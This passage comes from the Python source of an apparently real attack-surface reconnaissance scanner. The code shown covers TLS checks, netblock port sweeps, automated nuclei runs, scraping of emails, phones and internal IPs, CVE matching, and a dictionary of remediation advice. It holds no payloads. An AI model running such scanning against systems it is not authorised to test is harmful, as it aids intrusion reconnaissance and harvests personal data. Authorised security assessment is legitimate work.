                break
            if time.time() > t_end:
                break
    return len(findings) - n0


async def tls_config_scan(hosts, probes, certs, port_results, findings, cap=300):
    have443 = {h for h, p, _ in port_results if p == 443}
    cand = [h for h in sorted(hosts)
            if h in have443 or h in certs
            or (probes.get(h, {}).get("scheme") == "https")]
    if not cand and not port_results and not certs:
        cand = sorted(hosts)
    cand = cand[:cap]
    if not cand:
        print("  [tls-config] no TLS hosts to check", flush=True)
        return 0
    sem = asyncio.Semaphore(25)
    added = [0]

    async def one(h):
        async with sem:
            try:
                res = await asyncio.to_thread(_tls_host_checks, h)
            except Exception:
                res = []
            for f in res:
                findings.append(f)
                added[0] += 1
    await asyncio.gather(*[one(h) for h in cand])
    print(f"  [tls-config] {len(cand)} hosts -> {added[0]} findings", flush=True)
    return added[0]


# ---------------- phase 18: netblock port sweep ----------------
def _sweep_targets(netblocks, exclude, max_ips):
    nets = []
    for c in netblocks:
        try:
            net = ipaddress.ip_network(c, strict=False)
        except ValueError:
            continue
        if net.version == 4:
            nets.append(net)
    nets.sort(key=lambda n: n.prefixlen, reverse=True)   # tightest blocks first
    out = []
    for net in nets:
        if len(out) >= max_ips:
            break
        ips = [str(x) for x in net.hosts()] if net.num_addresses <= 256 \
            else _sample_addrs(str(net), min(48, max_ips))
        for ip in ips:
            if ip in exclude:
                continue
            out.append(ip)
            if len(out) >= max_ips:
                break
    return out


async def netblock_sweep(netblocks, live, domains, findings, ports, max_ips,
                         enabled=True, ptr_cap=150):
    """port-scan + banner + PTR on IPs in org-owned netblocks (phase 18).
    Returns (open-port rows, in-scope PTR names)."""
    if not enabled or not netblocks or not max_ips:
        return [], set()
    exclude = {ip for v in live.values() for ip in v}
    targets = _sweep_targets(netblocks, exclude, max_ips)
    if not targets:
        return [], set()
    results = await asyncio.gather(*[check_port(ip, p)
                                     for ip in targets for p in ports])
    rows = sorted(r for r in results if r)
    open_ips = []
    for ip, p, b in rows:
        if ip not in open_ips:
            open_ips.append(ip)
        extra = f" | {b[:70]}" if b else ""
        if p in RISK_PORTS:
            findings.append(f"[SWEEP-RISK] {ip}:{p} open {RISK_PORTS[p]} "
                            f"(org netblock){extra}")
        elif p not in (80, 443):
            findings.append(f"[SWEEP] {ip}:{p} open (org netblock){extra}")
    names = set()
    if open_ips:
        conn = _dns_connector()
        async with plain_session(conn) as s:
            res = await asyncio.gather(
                *[doh(s, _arpa(ip), "PTR", 0, j % 5 < 3)
                  for j, ip in enumerate(open_ips[:ptr_cap])])
            for ans in res:
                for n in _ptr_names(ans):
                    nn = str(n).rstrip(".").lower().strip()
                    if "." not in nn or " " in nn:
                        continue
                    for d in domains:
                        if nn == d or nn.endswith("." + d):
                            names.add(nn)
                            break
    print(f"  [sweep] {len(targets)} IPs x {len(ports)} ports -> "
          f"{len(rows)} open, {len(names)} in-scope names", flush=True)
    return rows, names


# ---------------- phase 19: nuclei engine ----------------
NUCLEI_SEV_MAP = {"critical": "NUCLEI-CRIT", "high": "NUCLEI-HIGH",
                  "medium": "NUCLEI-MED", "low": "NUCLEI-LOW",
                  "info": "NUCLEI-INFO", "unknown": "NUCLEI-INFO"}
NUCLEI_BIN_URL = "https://api.github.com/repos/projectdiscovery/nuclei/releases/latest"
_SUB_kw = {"creationflags": 0x08000000} if os.name == "nt" else {}


def find_nuclei():
    p = shutil.which("nuclei")
    if p:
        return p
    for cand in (os.path.join(os.getcwd(), "nuclei.exe"),
                 os.path.join(os.getcwd(), "nuclei")):
        if os.path.isfile(cand):
            return cand
    bindir = os.path.join(os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"),
                          "subenum", "bin")
    for name in ("nuclei.exe", "nuclei"):
        cand = os.path.join(bindir, name)
        if os.path.isfile(cand):
            return cand
    return None


async def ensure_nuclei():
    p = find_nuclei()
    if p:
        return p
    print("  [nuclei] binary not found - downloading latest release ...",
          flush=True)
    try:
        async with xsession() as s:
            j = await _json_get(s, NUCLEI_BIN_URL)
            if not j:
                return None
            arch = platform.machine().upper()
            want = "windows_arm64.zip" if arch.endswith("ARM64") \
                else "windows_amd64.zip"
            url = ""
            for aset in j.get("assets") or []:
                nm = str(aset.get("name") or "")
                if "nuclei" in nm and nm.endswith(want):
                    url = aset.get("browser_download_url") or ""
                    break
            if not url:
                print(f"  [nuclei] no {want} asset in latest release", flush=True)
                return None
            print(f"  [nuclei] fetching {url.rsplit('/', 1)[-1]} ...", flush=True)
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=600)) as r:
                if r.status != 200:
                    note_check_error("nuclei", f"download failed: HTTP {r.status}")
                    return None
                data = await r.read()
        bindir = os.path.join(
            os.environ.get("LOCALAPPDATA") or os.path.expanduser("~"),
            "subenum", "bin")
        os.makedirs(bindir, exist_ok=True)
        with zipfile.ZipFile(io.BytesIO(data)) as z:
            for n in z.namelist():
                base = os.path.basename(n.rstrip("/"))
                if base in ("nuclei.exe", "nuclei"):
                    dst = os.path.join(bindir, base)
                    with z.open(n) as src, open(dst, "wb") as f:
                        shutil.copyfileobj(src, f)
                    print(f"  [nuclei] installed -> {dst}", flush=True)
                    return dst
    except Exception as e:
        note_check_error("nuclei", f"install failed: {e}")
    return None


def _templates_ok():
    dirs = []
    if os.environ.get("APPDATA"):
        dirs.append(os.path.join(os.environ["APPDATA"], "nuclei", "templates"))
    if os.environ.get("XDG_CONFIG_HOME"):
        dirs.append(os.path.join(os.environ["XDG_CONFIG_HOME"], "nuclei", "templates"))
    dirs.append(os.path.expanduser("~/.config/nuclei/templates"))
    dirs.append(os.path.expanduser("~/nuclei-templates"))   # legacy v2 layout
    for d in dirs:
        try:
            if os.path.isdir(d) and os.listdir(d):
                return True
        except OSError:
            continue
    return False


async def nuclei_update_templates(binpath):
    if _templates_ok():
        return True
    print("  [nuclei] templates missing - one-time update (may take minutes) ...",
          flush=True)

    def _ut():
        return subprocess.run([binpath, "-update-templates", "-no-color"],
                              capture_output=True, timeout=900,
                              stdin=subprocess.DEVNULL, **_SUB_kw)
    try:
        res = await asyncio.to_thread(_ut)
        if not _templates_ok():
            tail = (res.stderr or b"").decode("utf-8", "ignore").strip()[-300:]
            if tail:
                print(f"  [nuclei] update rc={res.returncode}: {tail}", flush=True)
            return False
        return True
    except Exception as e:
        note_check_error("nuclei", f"template update failed: {e}")
        return False


def _system_resolvers():
    """reachable DNS servers for nuclei -r (fastdialer bypasses the OS resolver,
    and public UDP/53 is often blocked)"""
    out = []
    ns_arg = getattr(globals().get("a"), "nameservers", "") or ""
    for ip in re.split(r"[,\s]+", ns_arg):
        if ip:
            out.append(ip)
    if not out and SYS_RES is not None and getattr(SYS_RES, "nameservers", None):
        out = [str(x) for x in SYS_RES.nameservers]   # probed-alive set
    if not out and HAVE_DNSPY:
        try:
            import dns.resolver
            out = [str(x) for x in dns.resolver.Resolver().nameservers]
        except Exception:
            out = []
    if not out and os.name == "nt":
        try:
            txt = subprocess.run(["ipconfig", "/all"], capture_output=True,
                                 timeout=15, **_SUB_kw).stdout.decode(
                "utf-8", "ignore")
            out = re.findall(r"DNS Servers[^:]*: (\d+\.\d+\.\d+\.\d+)", txt)
        except Exception:
            out = []
    seen, res = set(), []
    for ip in out:
        try:
            ipaddress.ip_address(ip)
        except ValueError:
            continue
        if ip not in seen:
            seen.add(ip)
            res.append(ip)
    return res[:5]


async def nuclei_scan(binpath, live, probes, findings, sevs, rate, timeout_s,
                      max_find=400):
    fd, tmp = tempfile.mkstemp(prefix="sxe_nuc_", suffix=".txt")
    fd_o, ofile = tempfile.mkstemp(prefix="sxe_nuco_", suffix=".jsonl")
    os.close(fd_o)
    fd_e, efile = tempfile.mkstemp(prefix="sxe_nuce_", suffix=".log")
    os.close(fd_e)
    rfile = None
    try:
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            for h in sorted(live):
                f.write(f"{probes.get(h, {}).get('scheme') or 'https'}://{h}\n")
        cmd = [binpath, "-l", tmp, "-severity", sevs, "-jsonl", "-silent",
               "-no-color", "-duc", "-rl", str(rate), "-c", "50",
               "-timeout", "5", "-retries", "1", "-o", ofile, "-etags",
               "dos,headless,fuzz"]
        if PROXY:
            cmd += ["-proxy", PROXY]
        resolv = await asyncio.to_thread(_system_resolvers)  # ipconfig can
        if resolv:                                           # block 15s
            fd_r, rfile = tempfile.mkstemp(prefix="sxe_res_", suffix=".txt")
            with os.fdopen(fd_r, "w") as f:
                f.write("\n".join(resolv) + "\n")
            cmd += ["-r", rfile]
        outb, rc, err = b"", 0, b""

        def _run():
            # findings go to -o (file survives a hard kill where pipes lose
            # data); stderr to a file keeps diagnostics without pipe deadlock
            with open(efile, "wb") as ef:
                return subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=ef,
                                      timeout=timeout_s, stdin=subprocess.DEVNULL,
                                      **_SUB_kw)
        try:
            res = await asyncio.to_thread(_run)
            outb, rc, err = res.stdout or b"", res.returncode, b""
        except subprocess.TimeoutExpired as e:
            eo = e.stdout if isinstance(getattr(e, "stdout", None), bytes) else b""
            outb, err, rc = eo, b"timeout", -1
            print(f"  [nuclei] hard timeout after {timeout_s}s - "
                  f"keeping partial results", flush=True)
        except Exception as e:
            note_check_error("nuclei", f"run failed: {e}")
            return 0
        try:
            with open(efile, "rb") as ef:
                tail = ef.read()[-300:]
            if tail:
                err = tail
        except OSError:
            pass
        try:
            with open(ofile, "rb") as f:
                fileb = f.read()
        except OSError:
            fileb = b""
        outb = fileb + (b"\n" + outb if outb else b"")
        added, seen = 0, set()
        for line in outb.splitlines():
            try:
                ev = json.loads(line)
            except Exception:
                continue
            info = ev.get("info") or {}
            tag = NUCLEI_SEV_MAP.get(
                str(info.get("severity") or "info").lower(), "NUCLEI-INFO")
            host = str(ev.get("matched-at") or ev.get("host") or "")[:120]
            tplid = str(ev.get("template-id") or ev.get("templateID") or "?")
            name = str(info.get("name") or tplid)[:90]
            key = (tplid, host)
            if key in seen:
                continue
            seen.add(key)
            if added >= max_find:
                continue
            findings.append(f"[{tag}] {host} {name} ({tplid})")
            added += 1
        if rc not in (0, 1) and not added:
            tail = err.decode("utf-8", "ignore").strip()[-300:]
            if tail:
                print(f"  [nuclei] rc={rc}: {tail}", flush=True)
        print(f"  [nuclei] -> {added} findings "
              f"({len(seen)} unique template hits)", flush=True)
        return added
    finally:
        for p in (tmp, rfile, ofile, efile):
            try:
                os.unlink(p)
            except (OSError, TypeError):
                pass


async def nuclei_phase(live, probes, findings, sevs, rate, timeout_s):
    if not live:
        return 0
    binpath = await ensure_nuclei()
    if not binpath:
        print("  [nuclei] unavailable - skipping", flush=True)
        return 0
    if not await nuclei_update_templates(binpath):
        print("  [nuclei] templates unavailable - skipping", flush=True)
        return 0
    return await nuclei_scan(binpath, live, probes, findings, sevs, rate,
                             timeout_s)


async def surface_cve(probes, surf, all_paths, port_results, scripts_by_host,
                      findings, do_cve=True):
    """harvest contacts/params, map CDN edge, match banners+JS libs to CVE/EOL."""
    for h, i in probes.items():
        body = i.get("body") or b""
        if body:
            harvest(h, i.get("final_url") or f"{_burl(probes, h)}/", body, surf)

    # emails / phones / internal IPs -> findings (aggregated per host)
    for h in sorted(surf):
        s = surf[h]
        em = sorted(s["emails"])
        if em:
            extra = f" (+{len(em)-3} more)" if len(em) > 3 else ""
            findings.append(f"[EMAIL] {h}: {', '.join(em[:3])}{extra}")
        ph = sorted(s["phones"])
        if ph:
            extra = f" (+{len(ph)-3} more)" if len(ph) > 3 else ""
            findings.append(f"[PHONE] {h}: {', '.join(ph[:3])}{extra}")
        for ip, where in sorted(s["ips"].items()):
            findings.append(f"[INTERNAL-IP] {h} leaks {ip} ({where})")

    # sensitive query params in mined/archived endpoints. gates: the param
    # must carry an actual value - bare `?token` / `?code` flags (no '=') are
    # not evidence - and the same endpoint+key is reported once even when
    # archives store it under different percent-encodings of the same path
    nparam = 0
    seen_qp = set()
    for p in sorted(all_paths):
        if "?" not in p or nparam >= 150:
            continue
        for kv in p.split("?", 1)[1].split("&"):
            k, _eq, val = kv.partition("=")
            k = k.lower().strip()
            if k in SENS_PARAMS and _eq and unquote(val).strip():
                pk = (k, unquote(p.split("?", 1)[0]))
                if pk not in seen_qp:
                    seen_qp.add(pk)
                    findings.append(f"[PARAM] '{k}' in {p[:90]}")
                    nparam += 1
                break

    cdn = detect_cdn(probes)
    cves = []
    if not do_cve:
        return {"cdn": cdn, "params": nparam, "cves": [], "js": 0}

    # banner -> CVE / EOL
    port_by_host = {}
    for h, p, b in port_results:
        if b:
            port_by_host.setdefault(h, []).append(b)
    for h in sorted(probes):
        corp = host_corpus(h, probes, port_by_host)
        if not corp:
            continue
        clow = corp.lower()
        for rx, lo, hi, tag, label in CVE_DB:
            m = re.search(rx, clow)
            if not m:
                continue
            ver = m.group(1) if m.groups() else ""
            if ver and not _in_range(ver, lo, hi):
                continue
            line = f"[{tag}] {h}: {label}" + (f" (v{ver})" if ver else "")
            if line not in findings:
                findings.append(line)
                cves.append(line)
        for rx, lo, hi, label in EOL_DB:
            m = re.search(rx, clow)
            if m and _in_range(m.group(1), lo, hi):
                line = f"[EOL] {h}: {label} (v{m.group(1)})"
                if line not in findings:
                    findings.append(line)
                    cves.append(line)

    # JS library versions -> CVE
    nj = 0
    for h in sorted(probes):
        scripts = list(dict.fromkeys(list(probes[h].get("scripts") or [])
                                     + list(scripts_by_host.get(h, ()))))
        if not scripts:
            continue
        for u in scripts:
            # full URL path, not just the basename: bundlers/CDNs ship
            # versioned directories (/vendor/jquery/3.3.1/jquery.min.js)
            pkey = urlsplit(u).path.lower()
            fname = pkey.split("/")[-1] or pkey
            for rx, lo, hi, label in JS_CVE_DB:
                m = re.search(rx, pkey)
                if not m or not _in_range(m.group(1), lo, hi):
                    continue
                line = f"[JS-CVE] {h}: {label} in {fname[:50]}"
                if line not in findings:
                    findings.append(line)
                    cves.append(line)
                    nj += 1
    print(f"  [cve] -> {len(cves)} CVE/EOL matches, {nj} from JS libs, "
          f"{len(cdn)} edge-mapped hosts", flush=True)
    return {"cdn": cdn, "params": nparam, "cves": cves, "js": nj}


# ---------------- report ----------------
def ftag(f):
    """finding tag inside [...] ('' when malformed)."""
    try:
        return f[1:f.index("]")]
    except ValueError:
        return ""


def finding_host(f):
    """best-effort host a finding belongs to for per-host grouping ('' = other)."""
    body = f.split("]", 1)[1].strip() if "]" in f else f
    if " Host:" in body:                                    # vhost findings
        m = re.search(r"Host:\s*([^\s)]+)", body)
        if m:
            return m.group(1).rstrip(".,;:").lower()
    tok = re.split(r"\s", body, maxsplit=1)[0]
    tok = re.sub(r"^[a-zA-Z]+://", "", tok)
    tok = tok.split("/")[0].split("?")[0].split("#")[0]
    if tok.count(":") == 1:
        tok = tok.split(":")[0]                             # host:port
    tok = tok.strip(".,;()[]<>'\"")
    if "." in tok and re.fullmatch(r"[A-Za-z0-9._\-]+", tok):
        return tok.lower()
    return ""


REMEDIATION = {
    "PORT-RISK": "risky service exposed - firewall it off or put it behind VPN/auth and patch",
    "TAKEOVER-CONFIRMED": "subdomain takeover confirmed - delete the dangling DNS record or reclaim the resource",
    "TAKEOVER-DANGLING": "dangling CNAME - confirm ownership, remove the record if the resource is gone",
    "TAKEOVER-RISK-CNAME": "CNAME points at a claimable service - verify ownership of the target",
    "TAKEOVER": "verify and remove the dangling resource",
    "LEAK": "sensitive file served publicly - remove it from the webroot and rotate any credentials in it",
    "SECRET": "secret in client-side code - rotate it and keep it server-side",
    "AXFR": "zone transfer allowed - block AXFR at the authoritative nameservers",
    "CORS-REFLECT": "reflected Origin - restrict to an allowlist, never with credentials on untrusted origins",
    "CORS-WIDE": "wildcard CORS - restrict Access-Control-Allow-Origin to trusted origins",
    "CORS-OPEN": "origin reflected/wildcard without credentials - still exposes public "
                 "data cross-origin; scope Access-Control-Allow-Origin to trusted origins",
    "CORS-NULL": "Access-Control-Allow-Origin: null with credentials - sandboxed "
                 "iframes and file:// pages send Origin: null and can read this "
                 "session's responses; never allow null in the CORS allowlist",
    "PARAM-XSS": "reflected input - encode output context-aware or ship a strict CSP",
    "PARAM-SSTI": "template injection - never render user input as a template",
    "PARAM-SSRF": "SSRF - validate server-side fetch targets against scheme+host allowlists",
    "PARAM-TRAV": "path traversal - canonicalize and allowlist file paths server-side",
    "PARAM-SQLI": "SQL injection - use parameterized queries, drop string concatenation",
    "PARAM-CRLF": "CRLF injection - strip CR/LF from user input before header use",
    "EMAIL-INJECT": "CR/LF survives into an email field - strip CR/LF and "
                    "encode headers before composing mail from user input",
    "PARAM-REDIRECT": "open redirect - validate the target against an allowlist of hosts/paths",
    "PARAM-SSI": "SSI injection - stop parsing user input as server-side includes, disable Options +Includes for user content",
    "SHELLSHOCK": "shellshock (CVE-2014-6271 class) - patch bash and stop passing user headers into CGI environments",
    "PATH-BYPASS": "403 bypassed with path variants - enforce authorization in the application, not only in webserver config",
    "JWT-WEAK": "JWT signed with a guessable secret - rotate to a 256-bit random secret or switch to RS256/ES256",
    "CSWSH": "websocket accepts a cross-site Origin while session cookies are set - verify Origin/Sec-WebSocket-Origin per connection",
    "FTP-ANON": "anonymous FTP login accepted - disable anonymous accounts or remove read/write access",
    "SVC-DOCKER": "Docker API exposed unauthenticated - bind to localhost with TLS client certs, never 0.0.0.0:2375",
    "SVC-REDIS": "Redis answers PING without AUTH - enable requirepass/ACLs and bind behind a firewall",
    "SVC-ELASTIC": "Elasticsearch open to the world - enable X-Pack security / enable authentication",
    "SVC-MEMCACHED": "Memcached stats public - bind to localhost, use SASL, firewall port 11211",
    "SVC-ETCD": "etcd API unauthenticated - enable client cert auth and firewall 2379",
    "SVC-RSYNC": "rsync lists modules anonymously - restrict hosts allow, require auth per module",
"SVC-PG": "PostgreSQL answers AuthenticationOk with no credentials (trust auth) - switch pg_hba.conf to scram-sha-256 and firewall 5432",
"SVC-MQTT": "MQTT broker accepts CONNECT without credentials - set allow_anonymous=false with auth and firewall 1883",
"SVC-ZK": "ZooKeeper four-letter admin words answer without auth - set 4lw.commands whitelist to read-only words and firewall 2181",
"SVC-VNC": "VNC offers the None security type - require a password, disable no-auth access, firewall 5900",
"SVC-COUCH": "CouchDB lists databases unauthenticated - disable the admin party, require auth, firewall 5984",
"SVC-K8S": "Kubernetes API lists namespaces anonymously - run apiserver with anonymous-auth=false and RBAC",
    "MTHD-OVERRIDE": "method-override header honored - only honor it on explicit routes, never for state-changing verbs",
    "LOGIN-CSRF": "login form without anti-CSRF protection - add synchronizer token + SameSite cookies",
    "LOGIN-PLAIN": "password form served over plaintext http - serve the "
                   "whole login flow over HTTPS and enable HSTS",
    "LOGIN-ENUM": "login error discloses whether an account exists - return "
                  "one generic message for unknown user and bad password",
    "MIXED-CONT": "https page loads http:// subresources - upgrade all URLs to https (passive mixed content blocked anyway)",
    "COMMENT-LEAK": "secrets in HTML comments - remove commented-out config/"
                    "credentials before deploy (comments ship to every visitor)",
    "DOM-XSS": "DOM-based XSS (location data flows to an HTML/JS sink) - use "
               "textContent/sanitizers, never write location-derived data "
               "into innerHTML/eval",
    "PM-ORIGIN": "postMessage handler trusts any origin - validate "
                 "event.origin against an allowlist before consuming data",
    "HPP": "duplicate parameter keys are both honored - dedupe/"
           "canonicalize parameters server-side, use array notation "
           "(key[]) for intentional multi-values",
    "OAUTH-STATE": "OAuth authorize URL missing state - generate a random per-session state and verify it",
    "OAUTH-REDIR": "redirect_uri accepted from an unregistered host - enforce "
                   "an exact-match redirect_uri allowlist per client",
    "SMTP-RELAY": "open relay - require AUTH on submission, restrict RCPT to "
                  "local/known domains, never accept third-party recipients",
    "SMTP-TLS": "STARTTLS missing/broken on the MX - advertise STARTTLS, fix "
                "the TLS terminator, reject plaintext downgrade where possible",
    "SMTP-NULL-RELAY": "null-sender session accepted an external RCPT - reject "
                       "RELAY for MAIL FROM:<> except to local recipients "
                       "(bounce handling), so DSNs cannot be spoofed",
    "BUCKET-WRITE": "storage bucket accepts anonymous writes - set private "
                    "ACLs/ownership, block public PUT/DELETE, enable "
                    "versioning/object-lock and alert on policy changes",
    "AUTH-PLAIN": "HTTP Basic challenged over plaintext http - serve the "
                  "challenge over HTTPS with HSTS or use a token flow",
    "REDOS": "catastrophic regex backtracking on user input - use linear-time "
             "matching (atomic groups/possessive quantifiers), bound input "
             "length and request time",
    "JWT-EXP": "JWT without an exp claim - add a short expiry and reject "
               "tokens that lack one server-side",
    "MTA-STS-FILE": "MTA-STS policy file unreachable or not mode: enforce "
                    "while the TXT advertises a policy - serve "
                    "https://mta-sts.<domain>/.well-known/mta-sts.txt with "
                    "mode: enforce and a correct max_age",
    "ROBOTS-LEAK": "robots.txt discloses hidden paths - assume they are "
                   "public: move them behind auth and stop advertising them",
    "IIS-SHORTNAME": "IIS 8.3 shortname disclosure - disable 8.3 name creation (NtfsDisable8dot3NameCreation=1)",
    "JWT-JKU": "JWT key source points at an external jku/x5u URL - pin an allowlist of key URLs or use local keys",
    "PARAM-SECRET": "secret transmitted in the query string - move tokens to POST bodies/headers, scrub logs and Referer",
    "SQLI-EXTRACT": "confirmed SQL injection with data extraction - parameterize queries, rotate DB credentials, audit accessed data",
    "PARAM-SQLI-TIME": "time-based blind SQL injection - parameterize queries, disable DB error output, block stacked queries",
    "PARAM-NOSQLI": "NoSQL injection - typing-cast query input, reject query-operator objects ($gt/$ne) from user params",
    "PARAM-CMDI": "OS command injection - never pass user input to a shell, use exec with argument arrays + strict allowlists",
    "CMDI-HEADER": "blind command injection via request headers (User-Agent/Referer) - never pass header values to a shell, sanitize at the log/CGI boundary",
    "CMS-CFG-BAK": "CMS configuration backup exposed in the webroot - delete the file, rotate every credential inside it, keep config above the docroot",
    "CMS-XMLRPC": "xmlrpc.php enabled - brute-force amplification (system.multicall) and SSRF via pingback - disable xmlrpc or restrict to authenticated methods",
    "CMS-DEBUGLOG": "debug.log readable - disable WP_DEBUG_LOG in production, move logs outside the webroot, rotate any credentials that were logged",
    "CMS-VER-DISC": "CMS version disclosed - keep the CMS updated and remove readme/changelog/manifest files from the public webroot",
    "H2C": "plaintext HTTP/2 (h2c) skips TLS - disable h2c on the cleartext port, serve HTTP/2 only over TLS (h2)",
    "H3-QUIC": "HTTP/3 (QUIC) endpoint on udp/443 - inventory signal; rate-limit and firewall udp/443 the same way as tcp/443",
    "SVC-KUBELET": "kubelet /pods readable anonymously - bind kubelet to localhost with authentication-webhook, drop anonymous-auth (see --anonymous-auth=false)",
    "SVC-MONGO": "MongoDB runs listDatabases without credentials - enable authorization, bind to a private interface, require auth for all commands",
    "SVC-CONSUL": "Consul catalog readable unauthenticated - enable ACLs (default deny), restrict the HTTP API to a management network",
    "SVC-NACOS": "Nacos registry/config open unauthenticated - enable Nacos auth (nacos.core.auth.enabled=true) and restrict the console port",
    "SVC-SOLR": "Solr admin/cores open unauthenticated - enable authentication, block /solr/admin at the edge",
    "SVC-REGISTRY": "Docker Registry catalog open unauthenticated - require token auth on /v2/* and pull credentials for images",
    "SVC-RABBIT": "RabbitMQ management API unauthenticated - set management admin credentials and bind :15672 to a private network",
    "SVC-JENKINS": "Jenkins controller API readable anonymously - switch Authorization Strategy to logged-in users, disable Overall/Read for anonymous",
    "RDP-LEGACY": "RDP without Network Level Authentication/TLS - enable NLA (security layer TLS), restrict 3389 behind a gateway/VPN",
    "GQL-SUGGEST": "GraphQL field suggestions leak the schema - disable field suggestions (Apollo: allow_experimental_cli or noSuggestion) + block introspection",
    "API-DUMP": "unauthenticated JSON record dump - require auth on the endpoint, paginate + field-filter responses, audit who can call it",
    "PARAM-SOURCE": "source disclosure - deny php://filter stream wrappers, allowlist file paths, serve code outside the webroot",
    "XXE": "XML entity expansion - disable DTDs/external entities in the XML parser (libxml2 set_noent off)",
    "XXE-READ": "XXE file disclosure - parse XML with DTDs and external entities disabled, prefer JSON",
    "SSTI-RCE": "SSTI leading to RCE - sandbox or switch to logic-less templates, never render user input as a template",
    "AUTH-BYPASS": "auth bypass via edge headers - strip X-Forwarded-*/X-Original-URL at the proxy and enforce auth in-app",
    "HOST-INJECT": "host header injection - build absolute URLs from config, ignore untrusted Host/X-Forwarded-Host",
    "XPATHI": "XPath injection - bind variables in XPath queries, escape user input before query assembly",
    "LDAPI": "LDAP injection - escape filter values (ldap_escape) and use parameterized search filters",
    "JSONP": "JSONP callback - require a token/allowlist for callbacks and serve with a restrictive Content-Type",
    "PROTO-POLLUTION": "prototype pollution - freeze Object.prototype, use Map instead of {} merges, reject __proto__ keys",
    "GQL-BATCH": "GraphQL batching - cap array query depth/size per request and rate-limit by cost",
    "PARAM": "interesting parameter - test manually for IDOR/logic flaws",
    "WEAKCIPHER": "weak TLS cipher - disable it, prefer AEAD suites on TLS1.2+",
    "TLS10": "TLS 1.0 enabled - disable, require TLS 1.2+",
    "TLS11": "TLS 1.1 enabled - disable, require TLS 1.2+",
    "TLS-RSAKEX": "static-RSA key exchange (ROBOT surface) - enable ECDHE",
    "TLS-SMALLKEY": "small TLS key - move to >=2048-bit RSA / modern curves",
    "WEAKKEY": "weak key size - regenerate with >=2048-bit RSA",
    "WEAKSIG": "weak signature algorithm (MD5/SHA1) - reissue the certificate",
    "CERT-EXPIRED": "certificate expired - renew and automate renewal",
    "CERT-INVALID": "certificate chain invalid - fix intermediates / hostname match",
    "CERT-EXP-SOON": "certificate expiring soon - renew now",
"CERT-LONGVALID": "certificate lifetime exceeds 398 days - reissue with <=398d validity per CA/B Forum baseline",
    "DIR-CRIT": "sensitive path exposed - require auth or remove it",
    "DIR-HOT": "admin/debug path exposed - restrict by auth / IP allowlist",
    "DIR": "path discovered - review for sensitive content and access control",
    "GRAPHQL": "GraphQL endpoint exposed - disable introspection in prod, add auth + rate limits",
    "WEBDAV": "WebDAV enabled - disable it or require authentication",
    "JS-CVE": "JS library CVE - upgrade the library to a patched version",
    "EOL": "end-of-life software - upgrade to a supported release",
    "METHODS": "dangerous HTTP methods accepted - disable PUT/DELETE/TRACE at the server",
    "PUT-ALLOWED": "unauthenticated PUT persisted a file - disable PUT at the "
                   "server/WAF, require auth + CSRF on every write verb",
    "DELETE-ALLOWED": "unauthenticated DELETE executes - disable DELETE or "
                      "require auth on write verbs",
    "USER-ENUM": "SMTP VRFY/RCPT confirms valid mailboxes - disable VRFY/EXPN, "
                 "answer unknown users with the same reply, rate-limit RCPT",
    "COOKIE": "cookie flags - set Secure, HttpOnly and SameSite",
    "API-SPEC": "API docs exposed - restrict to authenticated / internal users",
    "TRACE": "HTTP TRACE enabled - disable it (XST risk)",
    "INTERNAL-IP": "internal IP in content - strip internal addresses from public responses",
    "EMAIL": "email address exposed in content - confirm it is meant to be "
             "public and rate-limit the contact form against harvesting abuse",
    "PHONE": "phone number exposed in content - confirm it is meant to be "
             "public and mask it if it is personal data (GDPR/DPDP)",
    "VHOST": "vhost discovered - confirm scope and access control",
    "VHOST-DEFAULT": "default-vhost differs for this Host header - check for vhost misrouting",
    "PORT": "open port - confirm it is intended, patched and firewalled",
    "SWEEP-RISK": "risky service on org netblock - verify ownership and patch",
    "HEADERS": "add missing security headers: HSTS, CSP, X-Content-Type-Options, Referrer-Policy, X-Frame-Options, Permissions-Policy",
    "SRI-MISSING": "third-party scripts without SRI - pin them with an "
                   "integrity attribute (subresource integrity) or self-host",
    "SPF-MISSING": "publish an SPF record for the domain",
    "SPF-OPEN": "SPF `+all` authorises every sender - use `-all` (or `~all` "
                "during a monitoring period) as the final mechanism",
    "DMARC-MISSING": "publish a DMARC record (p= at least none)",
    "DMARC-WEAK": "DMARC p=none only monitors - move to p=quarantine/p=reject "
                  "once legitimate senders are aligned",
    "DMARC-NOREPORT": "DMARC has no rua=/ruf= - add aggregate (rua) and forensic "
                      "(ruf) report addresses so spoofing attempts are visible",
    "DNSSEC-MISSING": "no DS delegation - sign the zone and publish DS at the "
                      "parent so DNS answers cannot be forged on the wire",
    "CAA-MISSING": "publish a CAA record restricting which CAs may issue "
                   "certificates for the domain",
    "MTA-STS-MISSING": "publish an MTA-STS policy (_mta-sts TXT v=STSv1 + "
                       "policy file at https://mta-sts.<domain>/.well-known/"
                       "mta-sts.txt) to prevent SMTP TLS downgrade attacks",
    "NSEC-WALK": "zone is enumerable via NSEC - move to NSEC3 (or online "
                 "signing / white lies) so zone names cannot be walked "
                 "without authentication",
    "WILDCARD": "wildcard DNS zone - treat brute-force hits under it with caution",
    "SWEEP": "netblock scan completed - review shared infrastructure",
    "NUCLEI-CRIT": "patch the matched template issue immediately",
    "NUCLEI-HIGH": "patch the matched template issue",
    "NUCLEI-MED": "review and remediate the matched template finding",
    "NUCLEI-LOW": "low-impact template hit - schedule a fix",
    "NUCLEI-INFO": "informational template hit - review for context",
    "CVE-CRIT": "critical CVE - patch the affected component now",
    "CVE-HIGH": "high CVE - patch the affected component",
    "CVE-MED": "medium CVE - upgrade the affected component",
    "GQL-DANGEROUS": "introspection shows write/admin fields - disable introspection, "
                     "require auth, review field-level authorization",
    "SSRF-METADATA": "cloud metadata endpoint read via SSRF - patch the fetch allowlist "
                     "NOW and rotate instance credentials",
    "CACHE-POISON": "cache stores poisoned response - vary on unkeyed headers, "
                    "purge the cache, add cache-busting rules",
    "IDOR": "same object readable by two accounts - enforce object-level authorization",
    "SMUGGLING": "possible HTTP request desync - normalize Transfer-Encoding/"
                 "Content-Length handling at every hop (verify with manual desync)",
    "JWT": "JWT in client content - keep tokens short-lived; never trust client claims",
    "JWT-NONE": "alg=none JWT in content - reject unsigned tokens, allowlist algorithms",
    "JWT-KID": "JWT kid uses path-like value - validate kid against an allowlist",
    "JWT-ADMIN": "privileged claims in client token - enforce authorization server-side",
    "CSP": "CSP allows unsafe-inline - encode output / nonce-based CSP",
    "CSP-WEAK": "weak CSP (unsafe-inline+eval/wildcard/data: script) - tighten directives",
    "CSP-REPORT": "CSP report-uri posts to an external host - confirm it is trusted",
